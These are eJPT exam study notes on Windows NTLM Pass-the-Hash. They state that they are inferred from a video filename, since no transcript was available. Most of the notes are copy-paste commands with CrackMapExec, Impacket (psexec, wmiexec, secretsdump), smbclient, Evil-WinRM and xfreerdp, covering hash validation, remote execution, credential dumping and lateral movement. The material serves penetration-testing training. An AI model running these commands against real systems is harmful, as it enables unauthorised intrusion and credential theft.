# 05 - Pass-the-Hash Attacks (eJPT)

Note: No transcript was provided. The following is a conservative, exam-focused summary inferred from the filename and typical eJPT/Kali workflows for Windows NTLM Pass-the-Hash (PtH).

## What the video covers (Introduction / big picture)
- What Pass-the-Hash is: authenticating to Windows services using an NTLM hash instead of the cleartext password.
- When to use it: after obtaining NTLM hashes (e.g., from a prior compromise, SAM/LSA dump) to laterally move without cracking passwords.
- Protocols that accept NTLM PtH: SMB (445), WMI/DCOM, WinRM (5985/5986), RDP (3389, with NLA).
- Typical goals: verify hash validity, enumerate shares, execute commands remotely, dump more credentials, and pivot.
- Key tools: Impacket (psexec.py, wmiexec.py, smbexec.py, smbclient.py, secretsdump.py), CrackMapExec, Evil-WinRM, xfreerdp, Samba smbclient with --pw-nt-hash.

## Flow (ordered)
1. Identify Windows targets/services (SMB/WinRM/RDP) with Nmap.
2. Obtain an NTLM hash (from previous steps: local SAM/LSASS dump, loot, etc.).
3. Validate the hash against a target using CrackMapExec (CME).
4. Enumerate SMB shares and accessible resources.
5. Execute commands remotely (psexec/wmiexec/smbexec) using the hash.
6. Dump credentials from the target (secretsdump) for further lateral movement.
7. Optionally, open interactive shells via Evil-WinRM or RDP (xfreerdp) with the hash.
8. Pivot to other hosts; repeat validation and execution.
9. Clean up artifacts and keep logs.

## Tools highlighted
- Impacket:
  - psexec.py / impacket-psexec
  - wmiexec.py / impacket-wmiexec
  - smbexec.py / impacket-smbexec
  - smbclient.py / impacket-smbclient
  - secretsdump.py / impacket-secretsdump
- CrackMapExec (CME)
- Evil-WinRM
- xfreerdp (FreeRDP)
- Samba smbclient (supports --pw-nt-hash; alternatively legacy pth-toolkit utilities on some systems)

## Typical command walkthrough (detailed, copy-paste friendly)
Assumptions (replace with your values):
- Target: 10.10.11.23
- Domain: ACME (omit -d or prefix if local account)
- User: Administrator
- NTLM hash: 8846f7eaee8fb117ad06bdd830b7586c (example)

1) Confirm target services
```bash
nmap -p 445,139,3389,5985 -sT -Pn 10.10.11.23
```

2) Validate the hash with CrackMapExec (local admin example)
```bash
crackmapexec smb 10.10.11.23 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth
# Domain account example:
# crackmapexec smb 10.10.11.23 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -d ACME
```

3) Enumerate SMB shares (quick win)
```bash
crackmapexec smb 10.10.11.23 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth --shares
```

4) Access a share using the hash (Samba smbclient)
```bash
# List shares
smbclient -L //10.10.11.23 -U 'Administrator' --pw-nt-hash --password=8846f7eaee8fb117ad06bdd830b7586c

# Connect to C$ and run a command (list dir)
smbclient //10.10.11.23/C$ -U 'Administrator' --pw-nt-hash --password=8846f7eaee8fb117ad06bdd830b7586c -c 'dir'
# Domain-form:
# smbclient //10.10.11.23/C$ -U 'ACME\\Administrator' --pw-nt-hash --password=8846f7eaee8fb117ad06bdd830b7586c
```

5) Execute commands with Impacket (PtH via NTLM)
- psexec (service-based, returns semi-interactive cmd.exe)
```bash
impacket-psexec Administrator@10.10.11.23 -hashes :8846f7eaee8fb117ad06bdd830b7586c
# or:
# psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c ACME/Administrator@10.10.11.23
```
- wmiexec (WMI/DCOM, often bypasses some service creation restrictions)
```bash
impacket-wmiexec Administrator@10.10.11.23 -hashes :8846f7eaee8fb117ad06bdd830b7586c
# or:
# wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c ACME/Administrator@10.10.11.23
```
- smbexec (SMB-based exec, fileless-like approach)
```bash
impacket-smbexec Administrator@10.10.11.23 -hashes :8846f7eaee8fb117ad06bdd830b7586c
# or:
# smbexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c ACME/Administrator@10.10.11.23
```

6) Dump credentials for further movement
```bash
# Dump local SAM/LSA secrets (requires admin on target)
impacket-secretsdump Administrator@10.10.11.23 -hashes :8846f7eaee8fb117ad06bdd830b7586c

# If target is a Domain Controller, dump NTDS (example):
# impacket-secretsdump -just-dc ACME/Administrator@10.10.11.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

7) Interactive shells with the hash
- Evil-WinRM (WinRM must be enabled)
```bash
evil-winrm -i 10.10.11.23 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```
- RDP (NLA) with FreeRDP pass-the-hash
```bash
xfreerdp /v:10.10.11.23 /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c
# Domain-form:
# xfreerdp /v:10.10.11.23 /u:ACME\\Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c
```

8) Quick multi-host validation (lateral reachability)
```bash
# Test a /24 range for valid hash and list shares where possible
crackmapexec smb 10.10.11.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth --shares
```

Tips for hash formatting in Impacket:
- You can supply only the NT hash by prefixing with a colon: -hashes :NTHASH
- Full LM:NT format also works; use a null LM placeholder if needed:
  - -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

## Practical tips
- You still need appropriate privileges: PtH does not grant more rights than the account has. Remote command execution over SMB/WMI typically requires local administrator on the target.
- Local vs domain accounts:
  - Use --local-auth in CrackMapExec for local accounts.
  - Prefix domain in Impacket as DOMAIN/username@host.
- If psexec fails with Access Denied, try wmiexec.py or smbexec.py; Windows remote UAC and service creation policies can block certain methods for non-built-in local admins.
- For SMB share access with hashes, prefer smbclient with --pw-nt-hash. Legacy pth-smbclient/pth-winexe exist on some systems, but Impacket and Samba are more standard.
- Be careful with account lockouts: repeated bad attempts can lock accounts. Validate once, then proceed surgically.
- RDP/NLA PtH works with xfreerdp /pth on many setups, but not all environments allow NTLM over RDP; fall back to Evil-WinRM or SMB/WMI if needed.
- After dumping credentials with secretsdump, immediately test newly found hashes to expand access.
- Keep consistent notation: LM:NT vs :NT; avoid trailing spaces; escape backslashes in shells (ACME\\Administrator).
- Document your steps and cleanup: some exec methods create/clean services; verify artifacts are removed.

## Minimal cheat sheet (one-screen flow)
```bash
# Replace IP, USER, DOMAIN, HASH below

# Scan target for SMB/WinRM/RDP
nmap -p 445,139,3389,5985 -sT -Pn <IP>

# Validate hash (local admin)
crackmapexec smb <IP> -u <USER> -H <NTHASH> --local-auth
# Domain account alternative
# crackmapexec smb <IP> -u <USER> -H <NTHASH> -d <DOMAIN>

# List shares
crackmapexec smb <IP> -u <USER> -H <NTHASH> --local-auth --shares

# SMB share access with hash
smbclient -L //<IP> -U '<USER>' --pw-nt-hash --password=<NTHASH>
smbclient //<IP>/C$ -U '<USER>' --pw-nt-hash --password=<NTHASH> -c 'dir'

# Remote command execution (choose one)
impacket-psexec <USER>@<IP> -hashes :<NTHASH>
impacket-wmiexec <USER>@<IP> -hashes :<NTHASH>
# Domain-form:
# impacket-wmiexec <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Dump creds
impacket-secretsdump <USER>@<IP> -hashes :<NTHASH>

# WinRM shell
evil-winrm -i <IP> -u <USER> -H <NTHASH>

# RDP (if allowed)
xfreerdp /v:<IP> /u:<USER> /pth:<NTHASH>
```

## Summary
- Pass-the-Hash lets you authenticate with an NTLM hash instead of a password to services that accept NTLM (SMB, WMI, WinRM, RDP).
- The typical eJPT workflow: discover Windows targets, validate the hash with CME, enumerate shares, execute commands (psexec/wmiexec/smbexec), dump more credentials (secretsdump), and pivot. For interactive access, Evil-WinRM and xfreerdp /pth are common.
- Use Impacketâ€™s -hashes :NTHASH syntax, apply --local-auth for local accounts in CME, and handle domain accounts with DOMAIN/username. If one exec method fails, try another.
- With no transcript available, the commands and flow above reflect standard, practical PtH procedures used in eJPT labs and Windows lateral movement.